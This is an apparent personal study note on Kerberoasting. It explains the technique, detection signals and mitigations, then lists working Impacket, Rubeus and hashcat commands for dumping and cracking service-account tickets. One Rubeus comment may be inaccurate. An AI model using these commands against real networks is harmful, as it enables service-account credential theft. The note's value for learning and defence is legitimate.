---
title: Kerberoasting
type: source
created: 2026-06-12
updated: 2026-06-12
tags: [kerberos, active-directory, credential-access]
source: raw/kerberoasting.md
---

# Kerberoasting

> Source: `raw/kerberoasting.md` (Gemini research summary)

## Summary

Any authenticated domain user can request a [[kerberos-authentication|TGS]]
for a service account with an SPN. The TGS is encrypted with that service
account's password hash, so an attacker requests tickets for SPN accounts
and cracks them offline (Hashcat/John) — no lockouts, no further network
activity required after extraction.

## Key points

- **Prerequisite**: valid domain creds + target account has an SPN + weak
  service-account password.
- **Tools**: Mimikatz, Rubeus to extract; Hashcat/John to crack.
- **Detection**: Event ID 4769 burst from one user across many SPNs; RC4
  (`0x17`) encryption type; honey SPNs.
- **Mitigations**: [[gmsa]], 25+ char passwords, enforce AES, least
  privilege on service accounts, Protected Users group.

## Commands

```bash
# Enumerate SPN accounts (Impacket, from Linux)
GetUserSPNs.py DOMAIN/user:password -dc-ip <dc-ip> -request

# Request + dump all roastable TGS as hashcat-crackable hashes
GetUserSPNs.py DOMAIN/user:password -dc-ip <dc-ip> -request -outputfile spns.txt

# Targeted Kerberoasting (if you have GenericWrite/GenericAll on an account
# without an SPN, set one yourself first — see acl-abuse)
GetUserSPNs.py DOMAIN/user:password -dc-ip <dc-ip> -request-user targetsvc
```

```powershell
# Rubeus — request and output hashcat-formatted hashes for all SPN accounts
Rubeus.exe kerberoast /outfile:hashes.txt

# Roast a single account, force RC4 (etype 23) for cheaper cracking
Rubeus.exe kerberoast /user:svc_sql /rc4opsec /outfile:sql.txt
```

```bash
# Crack with hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23 / RC4)
hashcat -m 13100 spns.txt wordlist.txt

# AES-encrypted tickets (etype 17/18)
hashcat -m 19700 spns.txt wordlist.txt   # AES128
hashcat -m 19800 spns.txt wordlist.txt   # AES256
```

## Links

- [[kerberos-authentication]] — protocol context (TGS-REQ/TGS-REP stage)
- [[gmsa]], [[ad-tiering-and-hardening]] — mitigations
- Compare with [[as-rep-roasting]] — same offline-cracking pattern, but
  targets the AS-REP (user hash) instead of the TGS (service account hash)
